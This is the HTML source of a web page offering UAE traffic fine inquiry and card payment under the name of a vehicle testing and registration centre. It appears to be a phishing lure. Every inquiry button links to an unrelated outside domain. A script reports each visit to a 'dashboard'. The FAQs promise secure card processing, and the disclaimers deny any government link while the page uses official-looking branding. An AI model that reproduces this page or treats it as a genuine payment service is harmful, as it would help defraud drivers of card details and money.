<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18027461174"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'AW-18027461174');
    </script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Google Search Console Verification -->
    <meta name="google-site-verification" content="vn3zZThzK-yiHQCahTbfm15rrH0yUsWpYMWOauR7ylc" />
    
    <!-- SEO Meta Tags -->
    <title>Al Elais Center - Traffic Services</title>
    <meta name="description" content="Inquire and pay UAE traffic fines securely through Al Elais Vehicle Testing & Registration Centre. Check fines by plate number, traffic file, or driving license.">
    <meta name="keywords" content="pay traffic fines uae, traffic fine inquiry, al elais center, dubai traffic fines, plate number check, traffic file inquiry, vehicle testing registration uae">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-green: #007f56; /* اللون الأخضر الداكن للنصوص والأزرار حسب الصورة */
            --mint-card-bg: #eef7f4; /* درجة المنت جرين الفاتحة جداً والناعمة لخلفية البطاقات */
            --body-bg: #ffffff; /* خلفية الصفحة بيضاء تماماً مثل الصورة */
            --text-dark: #2d3748; /* لون نصوص الأسئلة الشائعة */
            --border-color: #e2e8f0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: var(--body-bg);
            color: var(--text-dark);
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background-color: #ffffff;
            border-bottom: 1px solid var(--border-color);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .header-left { display: flex; align-items: center; gap: 15px; }
        .menu-icon { font-size: 24px; cursor: pointer; color: var(--primary-green); }
        .company-name { font-weight: 700; font-size: 1.1rem; color: #000000; letter-spacing: 0.5px; }
        
        .lang-btn {
            background-color: #ffffff;
            border: 1px solid var(--primary-green);
            color: var(--primary-green);
            padding: 6px 18px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 500;
            text-decoration: none;
            font-size: 0.9rem;
            transition: all 0.2s ease;
        }
        .lang-btn:hover {
            background-color: var(--mint-card-bg);
        }

        .container { padding: 20px 20px; max-width: 500px; margin: 0 o n; margin: 0 auto; }

        .main-title {
            text-align: center;
            color: var(--primary-green);
            font-size: 1.5rem;
            font-weight: 700;
            margin: 25px 0 35px 0;
            line-height: 1.4;
        }

        /* Service Cards - Matched to Image */
        .service-card {
            background-color: var(--mint-card-bg);
            border-radius: 24px;
            padding: 24px 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            text-decoration: none;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
        }

        .service-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.05);
        }

        .service-icon {
            font-size: 2.2rem;
            color: var(--primary-green);
            width: 50px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card-content { flex: 1; margin: 0 15px; text-align: left; }
        .card-title { color: var(--primary-green); font-size: 1.2rem; font-weight: 700; display: block; margin-bottom: 4px; }
        .card-desc { color: #718096; font-size: 0.9rem; line-height: 1.3; }

        /* Inquiry Button - Matched to Image */
        .query-btn {
            background-color: var(--primary-green);
            color: #ffffff;
            padding: 10px 24px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 1rem;
            border: none;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        
        .service-card:hover .query-btn {
            background-color: #006645;
        }

        /* FAQ Section */
        .faq-section { margin-top: 40px; }
        .faq-title { font-size: 1.4rem; font-weight: 700; color: #1a202c; margin-bottom: 25px; }
        
        .faq-item {
            background: #ffffff;
            border: 1px solid var(--border-color);
            margin-bottom: 12px;
            border-radius: 16px;
            overflow: hidden;
        }

        .faq-question {
            padding: 18px 20px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #000000;
            font-size: 1rem;
        }

        .faq-question .plus { color: var(--primary-green); font-size: 1.3rem; font-weight: bold; }

        .faq-answer { max-height: 0; overflow: hidden; transition: max-height 0.25s ease-out; background: #f8fafc; }
        .faq-answer p { padding: 18px 20px; margin: 0; font-size: 0.95rem; color: #4a5568; line-height: 1.6; text-align: left; }

        .legal-stack {
            margin: 40px 0;
            text-align: left;
        }
        
        .legal-stack a {
            display: block;
            color: var(--primary-green);
            text-decoration: none;
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 15px;
            padding: 14px;
            background: var(--mint-card-bg);
            border-radius: 14px;
            transition: all 0.2s;
            text-align: center;
        }

        .legal-stack a:hover {
            background: #e2f2ed;
        }

        footer {
            background-color: #0f172a;
            color: #ffffff;
            padding: 40px 20px;
            text-align: center;
        }

        .f-disclaimer {
            font-size: 0.85rem;
            color: #94a3b8;
            margin-bottom: 25px;
            line-height: 1.6;
            border-bottom: 1px solid #334155;
            padding-bottom: 20px;
            text-align: justify;
        }

        .f-info { font-size: 0.9rem; line-height: 2; text-align: center; }
        .f-info .comp-name { color: #ffffff; display: block; font-size: 1.1rem; font-weight: bold; margin-bottom: 10px; }
        .f-info .detail { color: #cbd5e1; display: block; }
        .f-info .operator-text { color: #ffffff; display: block; font-size: 1rem; font-weight: bold; margin-top: 15px; border-top: 1px dashed #334155; padding-top: 15px; }

        /* Welcome Banner Overlay */
        .banner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .banner-content {
            background-color: #ffffff;
            width: 100%;
            max-width: 480px;
            padding: 35px 25px;
            border-radius: 28px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            border: 1px solid var(--border-color);
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from { transform: scale(0.95); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .banner-header {
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--primary-green);
            margin-bottom: 20px;
            line-height: 1.4;
        }

        .banner-disclaimer-en {
            font-size: 0.95rem;
            color: #4a5568;
            line-height: 1.6;
            margin-bottom: 30px;
            text-align: justify;
            direction: ltr;
            font-weight: 400;
            border-top: 1px dashed var(--border-color);
            padding-top: 20px;
        }

        .banner-btn {
            background-color: var(--primary-green);
            color: #ffffff;
            border: none;
            padding: 14px 40px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 14px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }

        .banner-btn:hover {
            background-color: #006645;
        }
    </style>
</head>
<body>

<div id="welcomeBanner" class="banner-overlay">
    <div class="banner-content">
        <div class="banner-header">Inquire and Pay Traffic Fines by Vehicle Testing & Registration Centre</div>
        
        <div class="banner-disclaimer-en">
            Legal Disclaimer: We are an independent electronic platform providing transaction facilitation and traffic fine payment services as an intermediary handler. We explicitly declare that we do not represent any government entity, traffic police, or official transport authorities. All services are rendered independently.
        </div>
        
        <button class="banner-btn" onclick="startService()">Start Service</button>
    </div>
</div>

<header>
    <div class="header-left">
        <div class="menu-icon">☰</div>
        <div class="company-name">AL ELAIS VEHICLE TESTING & REGISTRATION CENTRE L.L.C</div>
    </div>
    <a href="index_ar.php" class="lang-btn">العربية</a>
</header>

<div class="container">
    
    <h1 class="main-title">UAE Traffic Fine Inquiry & Payment Services</h1>

    <a href="https://vasrsaea.online" class="service-card">
        <div class="service-icon"><i class="fas fa-car-side"></i></div>
        <div class="card-content">
            <span class="card-title">Inquiry by Plate Number</span>
            <p class="card-desc">Quick check using vehicle plate details</p>
        </div>
        <div class="query-btn">Inquiry</div>
    </a>

    <a href="https://vasrsaea.online" class="service-card">
        <div class="service-icon"><i class="fas fa-folder-open"></i></div>
        <div class="card-content">
            <span class="card-title">Inquiry by Traffic File</span>
            <p class="card-desc">View all fines listed on your personal file</p>
        </div>
        <div class="query-btn">Inquiry</div>
    </a>

    <a href="https://vasrsaea.online" class="service-card">
        <div class="service-icon"><i class="fas fa-id-card"></i></div>
        <div class="card-content">
            <span class="card-title">Inquiry by License</span>
            <p class="card-desc">Search for fines registered on your license</p>
        </div>
        <div class="query-btn">Inquiry</div>
    </a>

    <div class="faq-section">
        <div class="faq-title">Frequently Asked Questions</div>

        <div class="faq-item">
            <div class="faq-question">How can I inquire about traffic fines? <span class="plus">+</span></div>
            <div class="faq-answer"><p>You can easily inquire by selecting the appropriate method (Plate Number, Driving License, or Traffic File) and entering the required details.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">Is the payment gateway safe and secure? <span class="plus">+</span></div>
            <div class="faq-answer"><p>Yes, we use advanced SSL encryption and certified payment processing systems to ensure your financial details are fully secure.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">When will the fine clear after making payment? <span class="plus">+</span></div>
            <div class="faq-answer"><p>Traffic fines are usually updated and cleared in the official system within a few minutes up to 24 business hours after completing the transaction successfully.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">Can I pay fines for all emirates across the UAE? <span class="plus">+</span></div>
            <div class="faq-answer"><p>Yes, our platform supports inquiry and payment services for traffic fines registered across all emirates in the United Arab Emirates.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">What should I do if a fine still appears after payment? <span class="plus">+</span></div>
            <div class="faq-answer"><p>Please allow some time for system synchronization. If it persists after 24 hours, contact our technical support team with your receipt attached.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">Are there any additional service fees? <span class="plus">+</span></div>
            <div class="faq-answer"><p>A minimal convenience or administrative fee may apply to cover the costs of fast electronic clearance and portal technical solutions.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">How do I obtain my payment receipt? <span class="plus">+</span></div>
            <div class="faq-answer"><p>A digital receipt will be automatically sent to your registered email address right after the payment is successfully confirmed.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">Can I dispute a traffic fine through this website? <span class="plus">+</span></div>
            <div class="faq-answer"><p>No, this portal is explicitly for inquiry and clearance payments. Fine disputes must be processed directly through the official transport authorities.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">What payment methods are accepted? <span class="plus">+</span></div>
            <div class="faq-answer"><p>We accept all major international and local credit/debit cards, including Visa, MasterCard, and other authorized payment networks.</p></div>
        </div>

        <div class="faq-item">
            <div class="faq-question">Is the service available during public holidays? <span class="plus">+</span></div>
            <div class="faq-answer"><p>Yes, our platform operates 24/7, allowing you to check and pay traffic fines at any time, including weekends and official holidays.</p></div>
        </div>
    </div>

    <div class="legal-stack">
        <a href="privacy.php">Privacy Policy</a>
        <a href="terms.php">Terms and Conditions</a>
        <a href="disclaimer.php">Legal Disclaimer</a>
        <a href="refund.php">Refund Policy</a>
    </div>
</div>

<footer>
    <div class="f-disclaimer">
        Disclaimer: This website is completely independent and acts as an intermediary electronic portal to facilitate transaction processing and traffic fine clearing services. It belongs to AL ELAIS VEHICLE TESTING & REGISTRATION CENTRE L.L.C. It does not represent any official government entity and is not affiliated with Dubai Police.
    </div>
    
    <div class="f-info">
        <span class="comp-name">AL ELAIS VEHICLE TESTING & REGISTRATION CENTRE L.L.C</span>
        <span class="detail">Unified License Number: 889991</span>
        <span class="detail">Legal Address: Shop 1, Dubai Investment Park Second, Dubai, United Arab Emirates</span>
        <span class="detail">License issued by Dubai Department of Economy and Tourism, Valid until: 2026-06-07</span>
        <span class="operator-text">This website is operated by AL ELAIS VEHICLE TESTING & REGISTRATION CENTRE L.L.C</span>
    </div>
</footer>

<script>
    // Live traffic tracking code to connect to save.php for dashboard update
    function trackLiveVisitor() {
        fetch('save.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'action=track_visit&page=main_page_en'
        }).catch(err => console.log('Traffic tracking error'));
    }
    
    window.addEventListener('DOMContentLoaded', trackLiveVisitor);

    function startService() {
        document.getElementById('welcomeBanner').style.display = 'none';
    }

    document.querySelectorAll('.faq-question').forEach(item => {
        item.addEventListener('click', () => {
            const answer = item.nextElementSibling;
            const plus = item.querySelector('.plus');
            if (answer.style.maxHeight) {
                answer.style.maxHeight = null;
                plus.innerText = "+";
            } else {
                answer.style.maxHeight = answer.scrollHeight + "px";
                plus.innerText = "−";
            }
        });
    });
</script>

</body>
</html>
